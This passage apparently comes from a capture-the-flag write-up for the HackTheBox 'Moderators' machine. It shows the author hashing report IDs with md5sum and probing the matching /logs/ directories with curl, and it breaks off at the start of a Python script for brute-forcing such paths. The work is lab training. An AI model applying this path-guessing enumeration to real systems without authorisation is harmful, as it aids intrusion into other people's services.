<span id="cb4-13"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span> Last-Modified: <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Wed,</span> 24 Nov 2021 09:29:14 GMT</span>
<span id="cb4-14"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span> ETag: <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"0-5d1857dcad053"</span></span>
<span id="cb4-15"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span> Accept-Ranges: <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">bytes</span></span>
<span id="cb4-16"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span> Content-Length: <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">0</span></span>
<span id="cb4-17"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span> Content-Type: <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">text/html</span></span>
<span id="cb4-18"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span> </span></code></pre></div>
<p>After fuzzing the directory for a while I find nothing. Instead we change focus and look on the url, and more specific <code>e21cece511f43a5cb18d4932429915ed</code>.</p>
<div class="sourceCode" id="cb5" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb5-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  moderators echo <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-n</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"e21cece511f43a5cb18d4932429915ed"</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">wc</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-c</span></span>
<span id="cb5-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">32</span></span>
<span id="cb5-3"></span>
<span id="cb5-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  moderators echo <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-n</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"9798"</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">md5sum</span></span>
<span id="cb5-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">e21cece511f43a5cb18d4932429915ed</span>  <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-</span></span></code></pre></div>
<p>The value is the md5sum of log id. Lets use this to see if there is any information we can grab from the other 5 reports.</p>
<p><strong>2589:</strong></p>
<div class="sourceCode" id="cb6" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb6-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  moderators echo <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-n</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"2589"</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">md5sum</span></span>
<span id="cb6-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">743c41a921516b04afde48bb48e28ce6</span>  <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-</span></span>
<span id="cb6-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  moderators curl <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-v</span> http://moderators.htb/logs/743c41a921516b04afde48bb48e28ce6/</span>
<span id="cb6-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">*</span>   Trying 10.10.11.173:80...</span>
<span id="cb6-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">*</span> Connected to moderators.htb <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">10.10.11.173</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">port</span> 80 <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">#0)</span></span>
<span id="cb6-6"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> GET <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">/logs/743c41a921516b04afde48bb48e28ce6/</span> HTTP/1.1</span>
<span id="cb6-7"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> Host: <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">moderators.htb</span></span>
<span id="cb6-8"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> User-Agent: <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">curl/7.84.0</span></span>
<span id="cb6-9"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> Accept: <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">*/*</span></span>
<span id="cb6-10"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> </span>
<span id="cb6-11"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">*</span> Mark bundle as not supporting multiuse</span>
<span id="cb6-12"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span> HTTP/1.1 <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">200</span> OK</span>
<span id="cb6-13"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span> Date: <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Fri,</span> 02 Sep 2022 12:06:08 GMT</span>
<span id="cb6-14"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span> Server: <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Apache/2.4.41</span> <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Ubuntu</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb6-15"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span> Last-Modified: <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Wed,</span> 24 Nov 2021 09:29:14 GMT</span>
<span id="cb6-16"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span> ETag: <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"0-5d1857dc68a76"</span></span>
<span id="cb6-17"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span> Accept-Ranges: <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">bytes</span></span>
<span id="cb6-18"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span> Content-Length: <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">0</span></span>
<span id="cb6-19"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span> Content-Type: <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">text/html</span></span>
<span id="cb6-20"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span> </span>
<span id="cb6-21"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">*</span> Connection <span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">#0 to host moderators.htb left intact</span></span></code></pre></div>
<p><strong>3478:</strong></p>
<div class="sourceCode" id="cb7" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb7-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  moderators echo <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-n</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"3478"</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">md5sum</span>                                         </span>
<span id="cb7-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">b071cfa81605a94ad80cfa2bbc747448</span>  <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-</span></span>
<span id="cb7-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  moderators curl <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-v</span> http://moderators.htb/logs/b071cfa81605a94ad80cfa2bbc747448/</span>
<span id="cb7-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">*</span>   Trying 10.10.11.173:80...</span>
<span id="cb7-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">*</span> Connected to moderators.htb <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">10.10.11.173</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">port</span> 80 <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">#0)</span></span>
<span id="cb7-6"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> GET <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">/logs/b071cfa81605a94ad80cfa2bbc747448/</span> HTTP/1.1</span>
<span id="cb7-7"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> Host: <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">moderators.htb</span></span>
<span id="cb7-8"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> User-Agent: <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">curl/7.84.0</span></span>
<span id="cb7-9"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> Accept: <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">*/*</span></span>
<span id="cb7-10"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> </span>
<span id="cb7-11"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">*</span> Mark bundle as not supporting multiuse</span>
<span id="cb7-12"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span> HTTP/1.1 <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">200</span> OK</span>
<span id="cb7-13"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span> Date: <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Fri,</span> 02 Sep 2022 12:07:05 GMT</span>
<span id="cb7-14"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span> Server: <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Apache/2.4.41</span> <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Ubuntu</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb7-15"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span> Last-Modified: <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Wed,</span> 24 Nov 2021 09:29:14 GMT</span>
<span id="cb7-16"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span> ETag: <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"0-5d1857dc89dc4"</span></span>
<span id="cb7-17"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span> Accept-Ranges: <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">bytes</span></span>
<span id="cb7-18"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span> Content-Length: <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">0</span></span>
<span id="cb7-19"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span> Content-Type: <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">text/html</span></span>
<span id="cb7-20"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span> </span>
<span id="cb7-21"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">*</span> Connection <span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">#0 to host moderators.htb left intact</span></span></code></pre></div>
<p><strong>4221:</strong></p>
<div class="sourceCode" id="cb8" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb8-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  moderators echo <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-n</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"4221"</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">md5sum</span>                                         </span>
<span id="cb8-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">74d90aafda34e6060f9e8433962d14fd</span>  <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-</span></span>
<span id="cb8-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  moderators curl <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-v</span> http://moderators.htb/logs/74d90aafda34e6060f9e8433962d14fd/</span>
<span id="cb8-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">*</span>   Trying 10.10.11.173:80...</span>
<span id="cb8-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">*</span> Connected to moderators.htb <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">10.10.11.173</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">port</span> 80 <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">#0)</span></span>
<span id="cb8-6"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> GET <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">/logs/74d90aafda34e6060f9e8433962d14fd/</span> HTTP/1.1</span>
<span id="cb8-7"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> Host: <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">moderators.htb</span></span>
<span id="cb8-8"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> User-Agent: <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">curl/7.84.0</span></span>
<span id="cb8-9"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> Accept: <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">*/*</span></span>
<span id="cb8-10"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> </span>
<span id="cb8-11"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">*</span> Mark bundle as not supporting multiuse</span>
<span id="cb8-12"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span> HTTP/1.1 <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">200</span> OK</span>
<span id="cb8-13"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span> Date: <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Fri,</span> 02 Sep 2022 12:07:45 GMT</span>
<span id="cb8-14"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span> Server: <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Apache/2.4.41</span> <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Ubuntu</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb8-15"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span> Last-Modified: <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Wed,</span> 24 Nov 2021 09:29:14 GMT</span>
<span id="cb8-16"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span> ETag: <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"0-5d1857dc7365b"</span></span>
<span id="cb8-17"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span> Accept-Ranges: <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">bytes</span></span>
<span id="cb8-18"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span> Content-Length: <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">0</span></span>
<span id="cb8-19"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span> Content-Type: <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">text/html</span></span>
<span id="cb8-20"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span> </span>
<span id="cb8-21"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">*</span> Connection <span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">#0 to host moderators.htb left intact</span></span></code></pre></div>
<p><strong>7612:</strong></p>
<div class="sourceCode" id="cb9" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb9-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  moderators echo <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-n</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"7612"</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">md5sum</span>                                         </span>
<span id="cb9-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ce5d75028d92047a9ec617acb9c34ce6</span>  <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-</span></span>
<span id="cb9-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  moderators curl <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-v</span> http://moderators.htb/logs/ce5d75028d92047a9ec617acb9c34ce6/ </span>
<span id="cb9-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">*</span>   Trying 10.10.11.173:80...</span>
<span id="cb9-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">*</span> Connected to moderators.htb <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">10.10.11.173</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">port</span> 80 <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">#0)</span></span>
<span id="cb9-6"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> GET <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">/logs/ce5d75028d92047a9ec617acb9c34ce6/</span> HTTP/1.1</span>
<span id="cb9-7"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> Host: <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">moderators.htb</span></span>
<span id="cb9-8"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> User-Agent: <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">curl/7.84.0</span></span>
<span id="cb9-9"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> Accept: <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">*/*</span></span>
<span id="cb9-10"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> </span>
<span id="cb9-11"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">*</span> Mark bundle as not supporting multiuse</span>
<span id="cb9-12"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span> HTTP/1.1 <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">200</span> OK</span>
<span id="cb9-13"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span> Date: <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Fri,</span> 02 Sep 2022 12:08:50 GMT</span>
<span id="cb9-14"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span> Server: <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Apache/2.4.41</span> <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Ubuntu</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb9-15"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span> Last-Modified: <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Wed,</span> 24 Nov 2021 09:29:14 GMT</span>
<span id="cb9-16"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span> ETag: <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"0-5d1857dc949a9"</span></span>
<span id="cb9-17"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span> Accept-Ranges: <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">bytes</span></span>
<span id="cb9-18"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span> Content-Length: <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">0</span></span>
<span id="cb9-19"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span> Content-Type: <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">text/html</span></span>
<span id="cb9-20"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span> </span>
<span id="cb9-21"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">*</span> Connection <span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">#0 to host moderators.htb left intact</span></span></code></pre></div>
<p><strong>8121:</strong></p>
<div class="sourceCode" id="cb10" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb10-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  moderators echo <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-n</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"8121"</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">md5sum</span>  </span>
<span id="cb10-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">afecc60f82be41c1b52f6705ec69e0f1</span>  <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-</span></span>
<span id="cb10-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  moderators curl <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-v</span> http://moderators.htb/logs/afecc60f82be41c1b52f6705ec69e0f1/</span>
<span id="cb10-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">*</span>   Trying 10.10.11.173:80...</span>
<span id="cb10-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">*</span> Connected to moderators.htb <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">10.10.11.173</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">port</span> 80 <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">#0)</span></span>
<span id="cb10-6"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> GET <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">/logs/afecc60f82be41c1b52f6705ec69e0f1/</span> HTTP/1.1</span>
<span id="cb10-7"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> Host: <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">moderators.htb</span></span>
<span id="cb10-8"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> User-Agent: <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">curl/7.84.0</span></span>
<span id="cb10-9"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> Accept: <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">*/*</span></span>
<span id="cb10-10"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> </span>
<span id="cb10-11"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">*</span> Mark bundle as not supporting multiuse</span>
<span id="cb10-12"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span> HTTP/1.1 <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">200</span> OK</span>
<span id="cb10-13"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span> Date: <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Fri,</span> 02 Sep 2022 12:09:44 GMT</span>
<span id="cb10-14"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span> Server: <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Apache/2.4.41</span> <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Ubuntu</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb10-15"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span> Last-Modified: <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Wed,</span> 24 Nov 2021 09:29:14 GMT</span>
<span id="cb10-16"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span> ETag: <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"0-5d1857dc7e23f"</span></span>
<span id="cb10-17"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span> Accept-Ranges: <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">bytes</span></span>
<span id="cb10-18"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span> Content-Length: <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">0</span></span>
<span id="cb10-19"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span> Content-Type: <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">text/html</span></span>
<span id="cb10-20"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span> </span>
<span id="cb10-21"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">*</span> Connection <span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">#0 to host moderators.htb left intact</span></span></code></pre></div>
<p>None of them contain any information..</p>
</section>
<section id="step-2" class="level3">
<h3 class="anchored" data-anchor-id="step-2">Step 2</h3>
<p>Lets create a simple script to loop through 1 to 10000, create it’s corresponding md5 hash can send a GET request to <code>/logs/</code>. If <code>len(response.text)</code> is not equal to 0, print the result. Note that you can achieve the same thing by using <code>ffuf</code> or similar, but I though it would be fun to build a simple python script.</p>
<p>Below is the end result and it can be downloaded <a href="../../assets/scripts/moderators_findLogs.py">here</a>.</p>
<div class="sourceCode" id="cb11" style="background: #f1f3f5;"><pre class="sourceCode python code-with-copy"><code class="sourceCode python"><span id="cb11-1"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">#!/usr/bin/env python3</span></span>
<span id="cb11-2"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;"># by 0xPThree - exploit.se</span></span>
<span id="cb11-3"><span class="im" style="color: #00769E;
background-color: null;
font-style: inherit;">from</span> colorama <span class="im" style="color: #00769E;
background-color: null;
font-style: inherit;">import</span> Fore</span>
<span id="cb11-4"><span class="im" style="color: #00769E;
background-color: null;
font-style: inherit;">import</span> hashlib</span>
<span id="cb11-5"><span class="im" style="color: #00769E;
background-color: null;
font-style: inherit;">import</span> requests</span>
<span id="cb11-6"><span class="im" style="color: #00769E;
background-color: null;
font-style: inherit;">import</span> argparse</span>
<span id="cb11-7"><span class="im" style="color: #00769E;
background-color: null;
font-style: inherit;">import</span> time</span>
<span id="cb11-8"></span>
<span id="cb11-9">r <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> requests.session()</span>
<span id="cb11-10">storage <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> []</span>
<span id="cb11-11"></span>
<span id="cb11-12"><span class="kw" style="color: #003B4F;
